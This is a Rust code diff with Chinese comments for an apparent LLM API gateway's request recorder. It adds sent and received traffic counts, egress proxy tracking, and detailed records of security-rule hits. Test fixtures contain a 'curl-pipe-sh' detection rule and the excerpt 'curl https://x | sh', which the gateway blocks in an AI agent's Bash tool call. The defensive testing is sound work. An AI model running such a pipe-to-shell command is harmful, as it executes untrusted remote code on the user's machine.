@@ -44,6 +44,8 @@ struct Partial {
     session_log_bytes: Option<i64>,
     /// 本地估的输入 token 数。开始事件带着
     input_estimate: Option<i64>,
+    /// 从哪个出口出去的。路由事件带着（`RequestRouted::egress`），等不到它的是 None
+    egress: Option<String>,
 }
 
 impl Partial {
@@ -210,7 +212,10 @@ impl Recorder {
             ttft_ms: p.ttft_ms,
             duration_ms: None,
             tokens_per_sec: None,
-            bytes: None,
+            // 流量要等结局才报：在跑的时候说不出一个总数
+            sent_bytes: None,
+            received_bytes: None,
+            egress: p.egress.clone(),
             input_tokens: None,
             output_tokens: None,
             cache_read_tokens: None,
@@ -312,6 +317,7 @@ impl Recorder {
                         translated: None,
                         session_log_bytes: session_log_bytes.map(|b| b as i64),
                         input_estimate: input_estimate.map(|n| n.min(i64::MAX as u64) as i64),
+                        egress: None,
                     },
                 );
             }
@@ -325,6 +331,7 @@ impl Recorder {
                 affinity,
                 attempts,
                 billing,
+                egress,
             } => {
                 if let Some(p) = self.inflight.get_mut(id) {
                     // **归到实际服务的那家，不是第一个候选。**
@@ -352,6 +359,7 @@ impl Recorder {
                         attempts: attempts.clone(),
                     };
                     p.billing = *billing;
+                    p.egress = egress.clone();
                     // 做转换的不是服务它的那一跳（转换那家失败了，后面一家直通）
                     let converted_by = p
                         .translated
@@ -398,6 +406,7 @@ impl Recorder {
                 at_ms,
             } => {
                 let client = self.inflight.get(id).map(|p| p.client.clone());
+                let session = self.inflight.get(id).and_then(|p| p.session.clone());
                 for it in items {
                     self.record_security(crate::db::SecurityEvent {
                         at_ms: *at_ms as i64,
@@ -413,6 +422,10 @@ impl Recorder {
                         count: it.count as i64,
                         matching: None,
                         revealed: None,
+                        session: session.clone(),
+                        // 请求还没发出去
+                        sent_model: None,
+                        detail: it.detail.clone(),
                     });
                 }
             }
@@ -428,10 +441,12 @@ impl Recorder {
                 excerpt,
                 count,
                 revealed,
+                detail,
                 at_ms,
                 ..
             } => {
                 let client = self.inflight.get(id).map(|p| p.client.clone());
+                let session = self.inflight.get(id).and_then(|p| p.session.clone());
                 self.record_security(crate::db::SecurityEvent {
                     at_ms: *at_ms as i64,
                     request_id: *id as i64,
@@ -450,6 +465,10 @@ impl Recorder {
                     count: *count as i64,
                     matching: Some(*matching),
                     revealed: revealed.clone(),
+                    session,
+                    // 请求还没发出去
+                    sent_model: None,
+                    detail: detail.clone(),
                 });
             }
             /*
@@ -465,10 +484,18 @@ impl Recorder {
                 custom,
                 excerpt,
                 blocked,
+                detail,
                 at_ms,
                 ..
             } => {
                 let client = self.inflight.get(id).map(|p| p.client.clone());
+                let session = self.inflight.get(id).and_then(|p| p.session.clone());
+                // 回答已经在路上了：发给上游的是服务它的那一跳的名字
+                let sent_model = self
+                    .inflight
+                    .get(id)
+                    .map(|p| p.sent_model().to_string())
+                    .filter(|m| !m.is_empty());
                 self.record_security(crate::db::SecurityEvent {
                     at_ms: *at_ms as i64,
                     request_id: *id as i64,
@@ -483,6 +510,9 @@ impl Recorder {
                     count: 1,
                     matching: None,
                     revealed: None,
+                    session,
+                    sent_model,
+                    detail: detail.clone(),
                 });
             }
             Event::RequestHeaders {
@@ -504,7 +534,8 @@ impl Recorder {
             Event::RequestFinished {
                 id,
                 status,
-                bytes,
+                sent_bytes,
+                received_bytes,
                 duration_ms,
                 usage,
                 tokens_per_sec,
@@ -513,7 +544,7 @@ impl Recorder {
             } => self.settle(
                 *id,
                 Some(*status),
-                Some(*bytes),
+                (Some(*sent_bytes), Some(*received_bytes)),
                 Some(*duration_ms),
                 *usage,
                 answered_model.clone(),
@@ -533,7 +564,8 @@ impl Recorder {
             Event::RequestCancelled {
                 id,
                 status,
-                bytes,
+                sent_bytes,
+                received_bytes,
                 duration_ms,
                 usage,
                 answered_model,
@@ -541,7 +573,7 @@ impl Recorder {
             } => self.settle(
                 *id,
                 *status,
-                Some(*bytes),
+                (*sent_bytes, *received_bytes),
                 Some(*duration_ms),
                 *usage,
                 answered_model.clone(),
@@ -557,7 +589,8 @@ impl Recorder {
             Event::RequestFailed {
                 id,
                 message,
-                bytes,
+                sent_bytes,
+                received_bytes,
                 duration_ms,
                 usage,
                 answered_model,
@@ -565,7 +598,7 @@ impl Recorder {
             } => self.settle(
                 *id,
                 None,
-                *bytes,
+                (*sent_bytes, *received_bytes),
                 *duration_ms,
                 *usage,
                 answered_model.clone(),
@@ -601,7 +634,10 @@ impl Recorder {
                     ttft_ms: None,
                     duration_ms: Some(0),
                     tokens_per_sec: None,
-                    bytes: None,
+                    // 一个字节都没发给上游：没有流量可说，也没有出口
+                    sent_bytes: None,
+                    received_bytes: None,
+                    egress: None,
                     input_tokens: None,
                     output_tokens: None,
                     cache_read_tokens: None,
@@ -660,7 +696,8 @@ impl Recorder {
         // 结局事件自己带的状态码。没带的（失败、响应头之前的取消）用
         // 响应头那个事件记下的
         status: Option<u16>,
-        bytes: Option<u64>,
+        // 和上游之间的流量：（发出去的，收回来的）。一跳都没发出去的是一对 None
+        (sent_bytes, received_bytes): (Option<u64>, Option<u64>),
         duration_ms: Option<u64>,
         usage: Option<tw_api::UsageView>,
         answered_model: Option<String>,
@@ -693,6 +730,12 @@ impl Recorder {
             .attempts
             .last()
             .is_some_and(|a| a.outcome == tw_api::AttemptOutcome::Estimated);
+        // 网关估了数、一跳都没发出去的（选中的上游是别的格式）：和本地应答一样没有流量可说。
+        // 先问过上游、它回了 404 的，流量照记
+        let (sent_bytes, received_bytes) = match (sent_bytes, received_bytes) {
+            (Some(0), Some(0)) if local => (None, None),
+            traffic => traffic,
+        };
         //
         // **没跑完的一律按估算记**（取消、失败）。输出只算到断开那一刻，而
         // Anthropic 在流的末尾才报累计输出 —— 断在中间时手里那个数是个
@@ -781,7 +824,9 @@ impl Recorder {
                 Ending::Finished { tokens_per_sec } => tokens_per_sec,
                 _ => None,
             },
-            bytes: bytes.map(|b| b as i64),
+            sent_bytes: sent_bytes.map(|b| b.min(i64::MAX as u64) as i64),
+            received_bytes: received_bytes.map(|b| b.min(i64::MAX as u64) as i64),
+            egress: p.egress,
             input_tokens: u.map(|u| u.input as i64),
             output_tokens: u.map(|u| u.output as i64),
             cache_read_tokens: u.map(|u| u.cache_read as i64),
@@ -872,7 +917,8 @@ mod tests {
             id,
             model: String::new(),
             status: 200,
-            bytes: 1234,
+            sent_bytes: 2048,
+            received_bytes: 1234,
             duration_ms: 4000,
             usage,
             tokens_per_sec: None,
@@ -916,6 +962,7 @@ mod tests {
                     usage: None,
                     queued_ms: None,
                     skipped: None,
+                    proxy: None,
                 },
                 tw_api::AttemptView {
                     provider: "中转".into(),
@@ -927,16 +974,28 @@ mod tests {
                     usage: None,
                     queued_ms: None,
                     skipped: None,
+                    proxy: Some("机场".into()),
                 },
             ],
             billing: tw_api::Billing::PerToken,
+            egress: Some("机场".into()),
         });
+        // 在跑的时候已经说得出出口；流量要等结局
+        let running = r.in_flight_row(1).unwrap();
+        assert_eq!(running.egress.as_deref(), Some("机场"));
+        assert_eq!((running.sent_bytes, running.received_bytes), (None, None));
         r.on_event(&finished(1, None));
 
         let row = r.db().get(1).unwrap().unwrap();
         assert_eq!(
             row.provider, "中转",
             "转移之后这一行还归给第一个候选，成本和延迟都会记到没服务的那家头上"
+        );
+        // 出口是接下它的那一跳走的代理，流量是结局报的
+        assert_eq!(row.egress.as_deref(), Some("机场"));
+        assert_eq!(
+            (row.sent_bytes, row.received_bytes),
+            (Some(2048), Some(1234))
         );
         // 尝试链本身一个字都不能少 —— 归属改了，但「试过谁、为什么失败」
         // 是排查的全部价值。
@@ -949,6 +1008,12 @@ mod tests {
             routing.attempts[0].error.as_ref().map(|m| m.text.as_str()),
             Some("上游响应超时")
         );
+        let proxies: Vec<_> = routing
+            .attempts
+            .iter()
+            .map(|a| a.proxy.as_deref())
+            .collect();
+        assert_eq!(proxies, [None, Some("机场")]);
     }
 
     /// 一次就成的请求不该被这条规则改坏：链长度为 1，最后一跳就是它自己。
@@ -974,8 +1039,10 @@ mod tests {
                 usage: None,
                 queued_ms: None,
                 skipped: None,
+                proxy: None,
             }],
             billing: tw_api::Billing::PerToken,
+            egress: None,
         });
         r.on_event(&finished(2, None));
         assert_eq!(r.db().get(2).unwrap().unwrap().provider, "官方");
@@ -1006,6 +1073,7 @@ mod tests {
                     usage: None,
                     queued_ms: None,
                     skipped: None,
+                    proxy: None,
                 },
                 tw_api::AttemptView {
                     provider: "中转".into(),
@@ -1017,9 +1085,11 @@ mod tests {
                     usage: None,
                     queued_ms: None,
                     skipped: None,
+                    proxy: None,
                 },
             ],
             billing: tw_api::Billing::PerToken,
+            egress: None,
         });
         r.on_event(&finished(
             3,
@@ -1068,15 +1138,18 @@ mod tests {
                 usage: None,
                 queued_ms: None,
                 skipped: None,
+                proxy: None,
             }],
             billing: tw_api::Billing::PerToken,
+            egress: None,
         });
         assert_eq!(r.in_flight_row(1).unwrap().sent_model, "claude-sonnet-4-5");
         r.on_event(&Event::RequestFinished {
             id: 1,
             model: String::new(),
             status: 200,
-            bytes: 10,
+            sent_bytes: 0,
+            received_bytes: 10,
             duration_ms: 400,
             usage: None,
             tokens_per_sec: None,
@@ -1100,7 +1173,8 @@ mod tests {
             id: 2,
             model: String::new(),
             status: Some(200),
-            bytes: 10,
+            sent_bytes: Some(0),
+            received_bytes: Some(10),
             duration_ms: 100,
             usage: None,
             answered_model: Some("gpt-5-2025-08-07".into()),
@@ -1115,7 +1189,8 @@ mod tests {
                 args: Default::default(),
                 text: "broke".into(),
             },
-            bytes: Some(10),
+            sent_bytes: Some(0),
+            received_bytes: Some(10),
             duration_ms: Some(100),
             usage: None,
             answered_model: None,
@@ -1191,8 +1266,10 @@ mod tests {
                 usage: None,
                 queued_ms: None,
                 skipped: None,
+                proxy: None,
             }],
             billing: tw_api::Billing::PerToken,
+            egress: None,
         });
         r.on_event(&Event::RequestFailed {
             id: 1,
@@ -1203,7 +1280,8 @@ mod tests {
                 args: Default::default(),
                 text: "denied".into(),
             },
-            bytes: None,
+            sent_bytes: None,
+            received_bytes: None,
             duration_ms: Some(1),
             usage: None,
             answered_model: None,
@@ -1266,7 +1344,8 @@ mod tests {
             id: 1,
             model: String::new(),
             status: 200,
-            bytes: 1234,
+            sent_bytes: 0,
+            received_bytes: 1234,
             duration_ms: 4000,
             usage: None,
             tokens_per_sec: Some(180),
@@ -1300,7 +1379,8 @@ mod tests {
             id: 1,
             model: String::new(),
             status: Some(200),
-            bytes: 10,
+            sent_bytes: Some(0),
+            received_bytes: Some(10),
             duration_ms: 3_000,
             usage: None,
             answered_model: None,
@@ -1450,7 +1530,8 @@ mod tests {
                 args: Default::default(),
                 text: "cannot connect".into(),
             },
-            bytes: None,
+            sent_bytes: None,
+            received_bytes: None,
             duration_ms: None,
             usage: None,
             answered_model: None,
@@ -1474,6 +1555,11 @@ mod tests {
         });
         let row = r.db().get(9).unwrap().unwrap();
         assert!(row.local);
+        // 一个字节都没发给上游：没有流量可说，也没有出口
+        assert_eq!(
+            (row.sent_bytes, row.received_bytes, row.egress),
+            (None, None, None)
+        );
         // 网关自己答的：费用是一个确定的 0，和不计费的上游是同一句话
         assert_eq!(
             (row.billing, row.cost_micros),
@@ -1506,9 +1592,11 @@ mod tests {
                 usage: None,
                 queued_ms: None,
                 skipped: None,
+                proxy: None,
             }],
             billing: tw_api::Billing::Free,
             affinity: None,
+            egress: None,
         });
         r.on_event(&finished(3, None));
         let row = r.db().get(3).unwrap().unwrap();
@@ -1518,9 +1606,54 @@ mod tests {
         let routing: tw_api::RoutingView =
             serde_json::from_str(row.routing.as_deref().unwrap()).unwrap();
         assert_eq!(routing.attempts[0].status, Some(404));
+        // 先问过上游：那一趟的流量照记
+        assert_eq!(
+            (row.sent_bytes, row.received_bytes),
+            (Some(2048), Some(1234))
+        );
         let s = r.db().summary(0, i64::MAX).unwrap();
         assert_eq!(s.requests, 0, "估的数混进了请求总数");
         assert_eq!(s.locally_answered, 1);
+
+        // 选中的上游是别的格式、一个字节都没发：和本地应答一样没有流量可说，不是一对 0
+        r.on_event(&started(4, "gpt-5"));
+        r.on_event(&Event::RequestRouted {
+            id: 4,
+            route: "default".into(),
+            rule: "默认".into(),
+            group: None,
+            rewritten_by: vec![],
+            denied_by: None,
+            attempts: vec![tw_api::AttemptView {
+                provider: "官方".into(),
+                model: None,
+                outcome: tw_api::AttemptOutcome::Estimated,
+                status: None,
+                error: None,
+                ms: 1,
+                usage: None,
+                queued_ms: None,
+                skipped: None,
+                proxy: None,
+            }],
+            billing: tw_api::Billing::Free,
+            affinity: None,
+            egress: None,
+        });
+        r.on_event(&Event::RequestFinished {
+            id: 4,
+            model: String::new(),
+            status: 200,
+            sent_bytes: 0,
+            received_bytes: 0,
+            duration_ms: 1,
+            usage: None,
+            tokens_per_sec: None,
+            answered_model: None,
+        });
+        let row = r.db().get(4).unwrap().unwrap();
+        assert!(row.local);
+        assert_eq!((row.sent_bytes, row.received_bytes), (None, None));
     }
 
     #[test]
@@ -1582,8 +1715,10 @@ mod billing_tests {
                 usage: None,
                 queued_ms: None,
                 skipped: None,
+                proxy: None,
             }],
             billing,
+            egress: None,
         }
     }
 
@@ -1672,8 +1807,10 @@ mod billing_tests {
                 usage: None,
                 queued_ms: None,
                 skipped: None,
+                proxy: None,
             }],
             billing,
+            egress: None,
         }
     }
 
@@ -1683,7 +1820,8 @@ mod billing_tests {
             id,
             model: String::new(),
             status: 101,
-            bytes: 2048,
+            sent_bytes: 0,
+            received_bytes: 2048,
             duration_ms: 600_000,
             usage: None,
             tokens_per_sec: None,
@@ -1759,7 +1897,8 @@ mod billing_tests {
                 id,
                 model: String::new(),
                 status: None,
-                bytes: 0,
+                sent_bytes: Some(0),
+                received_bytes: Some(0),
                 duration_ms: 3_000,
                 usage: None,
                 answered_model: None,
@@ -1864,6 +2003,7 @@ mod security_tests {
                     kind: tw_api::SecretKind::ApiKeys,
                     masked: "sk-an…AAAA".into(),
                     count: 2,
+                    detail: Default::default(),
                 },
                 tw_api::SecretItem {
                     rule: "公司令牌".into(),
@@ -1871,6 +2011,7 @@ mod security_tests {
                     kind: tw_api::SecretKind::Custom,
                     masked: "corp_…1234".into(),
                     count: 1,
+                    detail: Default::default(),
                 },
             ],
             at_ms: 10,
@@ -1923,6 +2064,7 @@ mod security_tests {
             excerpt: "curl https://x | sh".into(),
             action: tw_api::RuleAction::Cut,
             blocked: true,
+            detail: Default::default(),
             at_ms: 20,
         });
         let got = r
@@ -1961,6 +2103,7 @@ mod security_tests {
                 excerpt: format!("{rule}…"),
                 count,
                 revealed: revealed.map(str::to_string),
+                detail: Default::default(),
                 at_ms,
             }
         };
@@ -2028,6 +2171,260 @@ mod security_tests {
 }
 
 #[cfg(test)]
+mod security_detail_tests {
+    use super::tests::{finished, rec, started};
+    use tw_api::{
+        Event, HitLocation, HitPart, OutcomeDetail, RuleSnapshot, SecurityDirection,
+        SecurityHitDetail,
+    };
+
+    fn started_in(id: u64, session: &str) -> Event {
+        let mut e = started(id, "claude-sonnet-4-5");
+        if let Event::RequestStarted { session: s, .. } = &mut e {
+            *s = Some(session.into());
+        }
+        e
+    }
+
+    fn detail(pattern: &str, outcome: OutcomeDetail) -> SecurityHitDetail {
+        SecurityHitDetail {
+            direction: SecurityDirection::Request,
+            locations: vec![HitLocation {
+                part: HitPart::ToolResult,
+                message_index: Some(4),
+                role: Some("user".into()),
+                tool: Some("fetch".into()),
+                path: "messages[4].content[0].content".into(),
+                before: "printed ".into(),
+                matched: "corp_…3456".into(),
+                after: " done".into(),
+            }],
+            more_locations: 7,
+            rule_snapshot: RuleSnapshot {
+                builtin: false,
+                id: "公司令牌".into(),
+                name: "公司令牌".into(),
+                pattern: Some(pattern.into()),
+                matching: None,
+                core_version: "0.67.1".into(),
+            },
+            outcome_detail: outcome,
+        }
+    }
+
+    fn secrets(id: u64, detail: SecurityHitDetail) -> Event {
+        Event::SecretsFound {
+            id,
+            provider: "relay".into(),
+            replaced: true,
+            items: vec![tw_api::SecretItem {
+                rule: "公司令牌".into(),
+                custom: true,
+                kind: tw_api::SecretKind::Custom,
+                masked: "corp_…3456".into(),
+                count: 8,
+                detail,
+            }],
+            at_ms: 10,
+        }
+    }
+
+    fn served_as(id: u64, model: &str) -> Event {
+        Event::RequestRouted {
+            id,
+            route: "default".into(),
+            rule: "默认".into(),
+            group: None,
+            rewritten_by: vec![],
+            denied_by: None,
+            affinity: None,
+            attempts: vec![tw_api::AttemptView {
+                provider: "relay".into(),
+                model: Some(model.into()),
+                outcome: tw_api::AttemptOutcome::Served,
+                status: Some(200),
+                error: None,
+                ms: 1,
+                usage: None,
+                queued_ms: None,
+                skipped: None,
+                proxy: None,
+            }],
+            billing: tw_api::Billing::PerToken,
+            egress: None,
+        }
+    }
+
+    fn denied(id: u64) -> Event {
+        Event::RequestFailed {
+            id,
+            model: String::new(),
+            source: tw_api::FailureSource::Denied,
+            message: tw_api::Msg {
+                code: "gw.content.refused".into(),
+                args: Default::default(),
+                text: "refused".into(),
+            },
+            sent_bytes: None,
+            received_bytes: None,
+            duration_ms: Some(1),
+            usage: None,
+            answered_model: None,
+        }
+    }
+
+    fn only(r: &crate::Recorder, id: i64) -> tw_api::SecurityEventView {
+        let mut got = r.db().security_of(&[id]).unwrap().remove(&id).unwrap();
+        assert_eq!(got.len(), 1, "{got:?}");
+        got.remove(0)
+    }
+
+    /// 细节原样存、原样读回来，安全日志和请求详情里一样；会话取请求的。发给上游的模型名
+    /// 请求还在路上时没有，落库之后是服务它的那一跳发的名字
+    #[test]
+    fn the_detail_comes_back_with_the_session_and_the_model_that_was_sent() {
+        let (_d, mut r) = rec();
+        let d = detail(
+            r"corp_[A-Z0-9]{12}",
+            OutcomeDetail::Replaced {
+                placeholders: vec!["<<TW_SECRET_1>>".into()],
+            },
+        );
+        r.on_event(&started_in(1, "s-1"));
+        r.on_event(&secrets(1, d.clone()));
+        let running = only(&r, 1);
+        assert_eq!(running.session.as_deref(), Some("s-1"));
+        assert_eq!(running.sent_model, None, "还没发出去");
+        assert_eq!(running.direction, SecurityDirection::Request);
+        assert_eq!(running.locations, d.locations);
+        assert_eq!(running.more_locations, 7);
+        assert_eq!(running.rule_snapshot, d.rule_snapshot);
+        assert_eq!(running.outcome_detail, d.outcome_detail);
+        // 原来的字段照旧
+        assert_eq!((running.excerpt.as_str(), running.count), ("corp_…3456", 8));
+
+        r.on_event(&served_as(1, "claude-haiku-4-5"));
+        r.on_event(&finished(1, None));
+        let done = only(&r, 1);
+        assert_eq!(done.sent_model.as_deref(), Some("claude-haiku-4-5"));
+        assert_eq!(done.session.as_deref(), Some("s-1"));
+        // 日志那一页说的是同一条
+        let page = r.db().security_events(None, 0, i64::MAX, None, 10).unwrap();
+        assert_eq!(page.events, vec![done]);
+    }
+
+    /// 被拒的请求一个字节都没发出去：那一行记着的名字是它要发的，不是发了的
+    #[test]
+    fn a_refused_request_sent_no_model() {
+        let (_d, mut r) = rec();
+        r.on_event(&started_in(2, "s-2"));
+        r.on_event(&Event::ContentMatched {
+            id: 2,
+            provider: "relay".into(),
+            rule: "no plan".into(),
+            custom: true,
+            matching: tw_api::ContentMatch::Contains,
+            action: tw_api::RuleAction::Block,
+            outcome: tw_api::ContentOutcome::Blocked,
+            in_tool_result: false,
+            excerpt: "forbidden-plan".into(),
+            count: 1,
+            revealed: None,
+            detail: SecurityHitDetail {
+                outcome_detail: OutcomeDetail::Blocked {
+                    client_notice: "[ThinkWatch] refused".into(),
+                },
+                ..Default::default()
+            },
+            at_ms: 5,
+        });
+        r.on_event(&denied(2));
+        let e = only(&r, 2);
+        assert_eq!(e.sent_model, None);
+        assert_eq!(e.session.as_deref(), Some("s-2"));
+        assert_eq!(
+            e.outcome_detail,
+            OutcomeDetail::Blocked {
+                client_notice: "[ThinkWatch] refused".into()
+            }
+        );
+    }
+
+    /// 工具调用审查报的时候回答已经在路上了：还没落库也说得出发给上游的名字
+    #[test]
+    fn a_flagged_tool_call_knows_the_model_before_the_row_is_written() {
+        let (_d, mut r) = rec();
+        r.on_event(&started_in(3, "s-3"));
+        r.on_event(&served_as(3, "claude-opus-4-1"));
+        r.on_event(&Event::ToolCallFlagged {
+            id: 3,
+            provider: "relay".into(),
+            tool: "Bash".into(),
+            rule: "curl-pipe-sh".into(),
+            custom: false,
+            why: String::new(),
+            excerpt: "curl x | sh".into(),
+            action: tw_api::RuleAction::Cut,
+            blocked: true,
+            detail: SecurityHitDetail {
+                direction: SecurityDirection::Response,
+                outcome_detail: OutcomeDetail::Cut {
+                    tool: "Bash".into(),
+                    arguments: "{}".into(),
+                    truncated: false,
+                    client_notice: "[ThinkWatch] cut".into(),
+                },
+                ..Default::default()
+            },
+            at_ms: 6,
+        });
+        let e = only(&r, 3);
+        assert_eq!(e.sent_model.as_deref(), Some("claude-opus-4-1"));
+        assert_eq!(e.direction, SecurityDirection::Response);
+        assert!(matches!(e.outcome_detail, OutcomeDetail::Cut { .. }));
+    }
+
+    /// 命中那一刻的规则跟着记录存：规则之后改了，先前那一条说的还是当时那一版
+    #[test]
+    fn a_rule_edited_later_does_not_rewrite_what_was_recorded() {
+        let (_d, mut r) = rec();
+        r.on_event(&started_in(1, "s"));
+        r.on_event(&secrets(
+            1,
+            detail("corp_[A-Z0-9]{12}", OutcomeDetail::Recorded {}),
+        ));
+        // 用户把规则改了；下一个请求按新的认
+        r.on_event(&started_in(2, "s"));
+        r.on_event(&secrets(
+            2,
+            detail("corp_[A-Z0-9]{16}", OutcomeDetail::Recorded {}),
+        ));
+        assert_eq!(
+            only(&r, 1).rule_snapshot.pattern.as_deref(),
+            Some("corp_[A-Z0-9]{12}")
+        );
+        assert_eq!(
+            only(&r, 2).rule_snapshot.pattern.as_deref(),
+            Some("corp_[A-Z0-9]{16}")
+        );
+    }
+
+    /// 细节存在记录那一行上：和请求记录一起过期
+    #[test]
+    fn the_detail_expires_with_the_request_log() {
+        let (_d, mut r) = rec();
+        r.on_event(&started_in(1, "s"));
+        r.on_event(&secrets(1, detail("x", OutcomeDetail::Recorded {})));
+        r.on_event(&finished(1, None));
+        assert!(r.db().security_of(&[1]).unwrap().contains_key(&1));
+        r.db().prune_before(i64::MAX).unwrap();
+        assert!(r.db().security_of(&[1]).unwrap().is_empty());
+        let page = r.db().security_events(None, 0, i64::MAX, None, 10).unwrap();
+        assert!(page.events.is_empty());
+    }
+}
+
+#[cfg(test)]
 mod translation_tests {
     use super::tests::{finished, rec, started};
 
@@ -2063,9 +2460,11 @@ mod translation_tests {
                     usage: None,
                     queued_ms: None,
                     skipped: None,
+                    proxy: None,
                 })
                 .collect(),
             billing: tw_api::Billing::PerToken,
+            egress: None,
         }
     }
 
@@ -2218,7 +2617,8 @@ mod cancellation_tests {
             id,
             model: String::new(),
             status: Some(200),
-            bytes: 312,
+            sent_bytes: Some(2048),
+            received_bytes: Some(312),
             duration_ms: 2_500,
             usage,
             answered_model: None,
@@ -2254,7 +2654,10 @@ mod cancellation_tests {
         assert_eq!(row.status, Some(200));
         assert_eq!(row.ttfb_ms, Some(900));
         assert_eq!(row.duration_ms, Some(2_500));
-        assert_eq!(row.bytes, Some(312));
+        assert_eq!(
+            (row.sent_bytes, row.received_bytes),
+            (Some(2048), Some(312))
+        );
         assert_eq!(row.input_tokens, Some(100_000));
         assert_eq!(row.output_tokens, Some(1));
         // Sonnet 4.5：输入 $3/M、输出 $15/M —— 十万个输入加一个输出
@@ -2332,7 +2735,8 @@ mod cancellation_tests {
             id: 1,
             model: String::new(),
             status: None,
-            bytes: 0,
+            sent_bytes: Some(0),
+            received_bytes: Some(0),
             duration_ms: 12_000,
             usage: None,
             answered_model: None,
@@ -2475,7 +2879,8 @@ mod failure_tests {
                 args: Default::default(),
                 text: "the stream broke: the upstream disconnected".into(),
             },
-            bytes: Some(312),
+            sent_bytes: Some(2048),
+            received_bytes: Some(312),
             duration_ms: Some(2_500),
             usage,
             answered_model: None,
@@ -2510,7 +2915,10 @@ mod failure_tests {
         assert_eq!(e.code, "t.broke");
         assert!(!row.cancelled);
         assert_eq!(row.status, Some(200), "状态码来自响应头那个事件");
-        assert_eq!(row.bytes, Some(312));
+        assert_eq!(
+            (row.sent_bytes, row.received_bytes),
+            (Some(2048), Some(312))
+        );
         assert_eq!(row.duration_ms, Some(2_500));
         assert_eq!(row.input_tokens, Some(100_000));
         // Sonnet 4.5：输入 $3/M、输出 $15/M
@@ -2554,7 +2962,8 @@ mod failure_tests {
                 args: Default::default(),
                 text: "`up` rate-limited us".into(),
             },
-            bytes: None,
+            sent_bytes: None,
+            received_bytes: None,
             duration_ms: Some(20_000),
             usage: None,
             answered_model: None,
@@ -2563,7 +2972,11 @@ mod failure_tests {
         let row = r.db().get(1).unwrap().unwrap();
         assert_eq!(row.cost_micros, None);
         assert_eq!(row.input_tokens, None);
-        assert_eq!(row.bytes, None, "响应头都没到，没有「收到了多少字节」");
+        assert_eq!(
+            (row.sent_bytes, row.received_bytes),
+            (None, None),
+            "一跳都没发出去，没有流量可说"
+        );
         assert_eq!(row.duration_ms, Some(20_000));
     }
 
@@ -2615,7 +3028,8 @@ mod failure_tests {
             model: String::new(),
             source: tw_api::FailureSource::Upstream,
             message: said.clone(),
-            bytes: Some(120),
+            sent_bytes: Some(0),
+            received_bytes: Some(120),
             duration_ms: Some(320),
             usage: None,
             answered_model: None,
@@ -2626,7 +3040,8 @@ mod failure_tests {
             id: 3,
             model: String::new(),
             status: Some(200),
-            bytes: 40,
+            sent_bytes: Some(0),
+            received_bytes: Some(40),
             duration_ms: 900,
             usage: None,
             answered_model: None,
@@ -2737,8 +3152,10 @@ mod settle_hook_tests {
                 usage: None,
                 queued_ms: None,
                 skipped: None,
+                proxy: None,
             }],
             billing: tw_api::Billing::PerToken,
+            egress: None,
         }
     }
 
@@ -2756,7 +3173,8 @@ mod settle_hook_tests {
             id: 2,
             model: String::new(),
             status: Some(200),
-            bytes: 1,
+            sent_bytes: Some(0),
+            received_bytes: Some(1),
             duration_ms: 1,
             usage: usage(),
             answered_model: None,
@@ -2770,7 +3188,8 @@ mod settle_hook_tests {
                 args: Default::default(),
                 text: "broke".into(),
             },
-            bytes: None,
+            sent_bytes: None,
+            received_bytes: None,
             duration_ms: None,
             usage: usage(),
             answered_model: None,
@@ -2808,7 +3227,8 @@ mod settle_hook_tests {
                 args: Default::default(),
                 text: "denied".into(),
             },
-            bytes: None,
+            sent_bytes: None,
+            received_bytes: None,
             duration_ms: None,
             usage: None,
             answered_model: None,
